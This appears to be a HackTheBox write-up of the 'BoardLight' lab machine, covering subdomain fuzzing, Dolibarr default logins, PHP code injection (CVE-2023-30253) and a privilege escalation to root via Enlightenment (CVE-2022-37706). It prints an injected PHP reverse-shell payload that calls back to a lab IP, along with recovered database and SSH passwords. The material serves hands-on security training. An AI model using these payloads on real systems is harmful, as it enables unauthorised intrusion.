---
title:  HTB - BoardLight
date: 2024-02-02 12:17:34 -0400
categories: [hackthebox , BoardLight]
tags: [HackTheBox, Dolibarr, PHP, CVE-2023-30253, LinPEAS, CVE-2022-37706]
image:
  path: /assets/img/post/boardlight/BoardLight-card.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hack the Box - BoardLight.
---

## Box Info

| Name                  | BoardLight       | 
| :-------------------- | ---------------: |
| Release Date          | 25 May, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## **Enumeration**

![Image](/assets/img/post/boardlight/0.png)

### SubDomain

```bash
wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt "Host: FUZZ.board.htb" -u [](http://board.htb/)[http://board.htb](http://board.htb)
```

![Image](/assets/img/post/boardlight/1.png)

![Image](/assets/img/post/boardlight/2.png)

![Image](/assets/img/post/boardlight/e.png)

![Image](/assets/img/post/boardlight/z.png)

The login page is using the default credentials by Dolibarr

## Dolibarr 17.0.0

### CVE-2023-30253

[`Missing Error Handling | OWASP Foundation`](https://owasp.org/www-community/vulnerabilities/Missing_Error_Handling)

The version Dolibarr 17.0.0 has a vulnerability to `PHP Code injection` (RCE) (CVE-2023-30253)

[Dolibarr confirm RCE in the version 17.0.0](https://github.com/advisories/GHSA-9wqr-5jp4-mjmh)


[Security Advisory: Dolibarr 17.0.0 PHP Code Injection (CVE-2023-30253) - Swascan](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)

![Image](/assets/img/post/boardlight/b.png)

We make a page and use PHP for try to get a reverse shell.

![Image](/assets/img/post/boardlight/x.png)

![Image](/assets/img/post/boardlight/s.png)

```js
<?PHP echp system("whoami");?>
```

![Image](/assets/img/post/boardlight/a.png)

```php
<section id="mysection1" contenteditable="true">
<?PHP echo system("bash -c 'bash -i >& /dev/tcp/10.10.14.88/7777 0>&1'");?>
</section>
```

[https://wiki.dolibarr.org/index.php?title=Backups](https://wiki.dolibarr.org/index.php?title=Backups)

### Credentials

```zsh
$dolibarr_main_db_name='dolibarr'; $dolibarr_main_db_prefix='llx_'; $dolibarr_main_db_user='dolibarrowner'; $dolibarr_main_db_pass='serverfun2$2023!!'; $dolibarr_main_db_type='mysqli';

dolibarrowner

serverfun2$2023!!

cat /etc/passwd | grep bash

SSH:

larissa

serverfun2$2023!!
```

![Image](/assets/img/post/boardlight/3.png)


I found no exploitable points and uploaded linpeas to scan for vulnerabilities.

## LinPEAS

`_LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix_/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)_`

[PEASS-ng/linPEAS at master · peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

## Enlightenment_sys

Enlightenment_sys in some cases could be an internal component or refer to scripts or tools for interacting with Enlightenment; it could also be a module or a configuration depending on the context.

![Image](/assets/img/post/boardlight/4.png)

In this point it's just exploit the CVE for scalation previleges and get the root flag.

[GitHub - MaherAzzouzi/CVE-2022-37706-LPE-exploit: A reliable exploit + write-up to elevate privileges to root. (Tested on Ubuntu 22.04)](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main)

Run exploit.sh and you obtained the shell as `root`.